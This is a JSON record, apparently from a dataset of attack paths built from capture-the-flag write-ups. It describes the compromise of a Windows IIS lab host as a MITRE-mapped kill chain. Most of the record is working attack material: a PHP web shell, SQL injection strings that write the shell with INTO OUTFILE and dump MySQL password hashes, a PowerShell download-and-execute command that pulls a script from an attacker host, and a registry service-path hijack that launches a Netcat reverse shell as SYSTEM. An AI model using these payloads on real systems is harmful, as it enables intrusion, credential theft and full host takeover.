@@ -1,0 +1,124 @@
+{
+  "id": "ap-0022",
+  "title": "IIS Web Server Compromise via SQLi and Service Path Hijacking",
+  "summary": "Exploiting an SQL Injection vulnerability after bypassing proxy controls, retrieving credentials, and escalating privileges to SYSTEM via a service's misconfigured binary path.",
+  "attack_path_markdown": "### Step 1: Reconnaissance\nPerform port scan and web enumeration.\n### Step 2: Delivery & Exploitation (Web)\nBypass access controls and exploit SQL injection to upload a PHP web shell.\n### Step 3: Installation & C2\nEstablish a stable PowerShell shell, extract credentials from the database, and perform internal enumeration.\n### Step 4: Privilege Escalation\nHijack a vulnerable service's image path to gain a SYSTEM shell.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target operating system, open ports, and running services.",
+      "actions": [
+        "Check host availability using `ping 10.10.10.167` (TTL 127/128 indicates Windows).",
+        "Perform a full TCP port scan using Nmap with fast options: `nmap -p- -sT -n --min-rate 5000 -v -oG control-nmap-all 10.10.10.167`.",
+        "Run service and version detection on discovered ports (e.g., 80, 22, 139, 445, 3306): `nmap -sC -sV -p80,139,3306,445,49166,49167 10.10.10.167 -oN target.nmap`.",
+        "Enumerate web technologies using WhatWeb: `whatweb 10.10.10.167`.",
+        "Check HTTP headers using Curl: `curl -s -I 10.10.10.167`."
+      ],
+      "tools": ["Nmap", "WhatWeb", "Curl", "Ping"],
+      "techniques": ["Active Scanning", "OS Fingerprinting", "Application Discovery"],
+      "mitre_ids": ["T1595", "T1590"],
+      "indicators": ["Microsoft IIS 10.0 detected", "Port 3306 (MySQL) open"],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "List of open ports and IIS 10.0 server detection.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of payloads and environment for exploitation.",
+      "actions": [
+        "Prepare a PHP web shell payload: `<?php echo system($_REQUEST['cmd']); ?>`.",
+        "Prepare the Netcat binary (`nc.exe`) for later user."
+      ],
+      "tools": ["Custom Scripting", "Netcat"],
+      "techniques": ["Web Shell Development"],
+      "mitre_ids": ["T1210"],
+      "indicators": [],
+      "preconditions": "Knowledge of PHP execution capability on the target.",
+      "expected_outcome": "Ready-to-deploy web shell and customized reverse shell payload."
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Bypassing access controls to the admin page and exploiting SQL Injection to gain file write access.",
+      "actions": [
+        "Bruteforce HTTP headers using Ffuf (referred to as `Qfoot`) with the `non-standard-fields` dictionary, testing against `/admin/admin.php` and checking response length.",
+        "The header `X-Forwarded-For` set to an internal IP (e.g., `192.168.4.28`) successfully bypasses the proxy requirement.",
+        "Use Burp Suite/Curl to inject the required header for access.",
+        "Exploit SQL Injection in `/searchproducts.php` (e.g., `' ORDER BY 6 -- ` to determine column count).",
+        "Use `INTO OUTFILE` to confirm file write access (e.g., `' UNION SELECT 1, 'probando', 3, 4, 5, 6 INTO OUTFILE 'C:\\inetpub\\wwwroot\\prueba.txt' -- `)."
+      ],
+      "tools": ["Ffuf", "Burp Suite", "Curl", "Custom SQLi script"],
+      "techniques": ["SQL Injection (T1190, T1059.006)", "HTTP Header Spoofing (T1090)"],
+      "mitre_ids": ["T1190", "T1059.006"],
+      "indicators": ["Successful access to admin page", "Error messages during query testing", "File creation confirmation (`prueba.txt` exists)."],
+      "preconditions": "Web application vulnerability (SQLi) and file write capability (`INTO OUTFILE`).",
+      "expected_outcome": "The web shell file (`pouet.php`) is created on the target server."
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Uploading and executing the web shell to gain initial remote command execution.",
+      "actions": [
+        "Upload the PHP web shell: `' UNION SELECT 1, '<?php echo system($_REQUEST[\'cmd\']); ?>', 3, 4, 5, 6 INTO OUTFILE 'C:\\inetpub\\wwwroot\\pouet.php' -- `.",
+        "Trigger remote command execution via HTTP GET request: `http://10.10.10.167/pouet.php?cmd=whoami` (Initial user: `NT AUTHORITY\\IUSR`)."
+      ],
+      "tools": ["Curl/Web Browser"],
+      "techniques": ["Remote Command Execution (T1059.006)"],
+      "mitre_ids": ["T1059.006"],
+      "indicators": ["Command output (e.g., NT AUTHORITY\\IUSR) returned in the HTTP response."],
+      "preconditions": "PHP web shell is accessible and executed by the IIS server process."
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation & Command & Control",
+      "description": "Establishing a persistent and interactive shell, then performing credential extraction and internal reconnaissance.",
+      "actions": [
+        "Extract credentials from the MySQL database using SQLi: `' UNION SELECT 1, CONCAT(user, 0x3a, password), 3, 4, 5, 6 FROM mysql.user -- `.",
+        "Filter and extract hashes: `awk -F: '{print $2}' | sort -u`.",
+        "Crack obtained hashes (e.g., using CrackStation) to find plaintext credentials (e.g., 'Hector' and 'Manager').",
+        "Host a stable PowerShell shell script (e.g., Pittyshel) on the attacker machine on port 80.",
+        "Execute the PowerShell command remotely to download and run the script: `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.29/pittyshel.ps1')`.",
+        "Stabilize the shell (using `python3 -m http.server 80`, Netcat listener on 443, and the PTY trick `control z, stty raw -echo; fg; ctrl L`).",
+        "Create PowerShell credential object for user 'Hector': `$user = 'Hector'; $pass = ConvertTo-SecureString -AsPlainText -Force 'PASSWORD'; $cred = New-Object System.Management.Automation.PSCredential($user, $pass)`.",
+        "Execute commands as Hector: `Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }`.",
+        "Transfer and execute WinPEAS for system enumeration: `copy \\\\10.10.14.29\\SMDFOLDER\\winpeas.exe C:\\Users\\TEMP\\winpeas.exe`."
+      ],
+      "tools": ["Netcat Listener", "PowerShell", "Impacket (smbserver)", "WinPEAS", "CrackStation"],
+      "techniques": ["Data from Local System (T1005)", "Credential Dumping (T1555)", "Remote Services (T1021)", "System Information Discovery (T1082)"],
+      "mitre_ids": ["T1005", "T1555", "T1021", "T1082"],
+      "indicators": ["Successful execution of `whoami` as 'Hector'", "WinPEAS reporting full control on services (SEGLOCOm)."],
+      "preconditions": "Initial command execution via web shell, valid user credentials.",
+      "expected_outcome": "Interactive shell as Hector, identification of vulnerable services."
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving maximum privilege access (SYSTEM) via Service Path Hijacking.",
+      "actions": [
+        "Transfer Netcat to a known AppLocker bypass path: `copy \\\\10.10.14.29\\SMDFOLDER\\nc.exe C:\WINDOWS\System32\spool\drivers\color\nc.exe`.",
+        "Modify the service path (`ImagePath`) for the vulnerable service (`SEGLOCOm`) using `reg add` to point to the malicious binary (Netcat).",
+        "Command: `reg add HKLM\SYSTEM\CurrentControlSet\Services\SEGLOCOm /v ImagePath /t REG_EXPAND_SZ /d 'C:\WINDOWS\System32\spool\drivers\color\nc.exe 10.10.14.29 443 -e cmd.exe' /f`.",
+        "Set up a Netcat listener on the attacker machine (port 443).",
+        "Restart the service to trigger the malicious path execution: `sc stop SEGLOCOm` then `sc start SEGLOCOm`.",
+        "Obtain NT AUTHORITY\\SYSTEM shell and retrieve the root flag."
+      ],
+      "tools": ["Impacket (SMB Server)", "Netcat Listener", "SC (Service Control)", "REG (Registry tool)"],
+      "techniques": ["Service Registry Permission Modification (T1574.008)", "Hijack Execution Flow (T1574)"],
+      "mitre_ids": ["T1574.008", "T1543.003", "T1574"],
+      "indicators": ["Service restart success", "Reverse connection received as NT AUTHORITY\\SYSTEM"],
+      "preconditions": "Full Control over the service configuration (`ImagePath`).",
+      "expected_outcome": "Privilege escalation to NT AUTHORITY\\SYSTEM."
+    }
+  ],
+  "tactics": ["Initial Access", "Execution", "Persistence", "Credential Access", "Privilege Escalation"],
+  "techniques": ["SQL Injection", "Web Shell", "Service Registry Path Hijacking", "Hash Cracking"],
+  "mitre_ids": ["T1190", "T1505.003", "T1574.008", "T1110"],
+  "hosts": ["10.10.10.167", "10.10.14.29"],
+  "privs_obtained": ["NT AUTHORITY\\IUSR", "Hector", "NT AUTHORITY\\SYSTEM"],
+  "confidence": 0.9,
+  "source_file": "",
+  "notes": "The procedure involved crafting a custom bash script (`sqli.sh`) to automate the SQL injection steps and remote command execution phases." ,
+  "labels": ["attack_path", "sqli", "iis", "windows", "privesc"]
+}
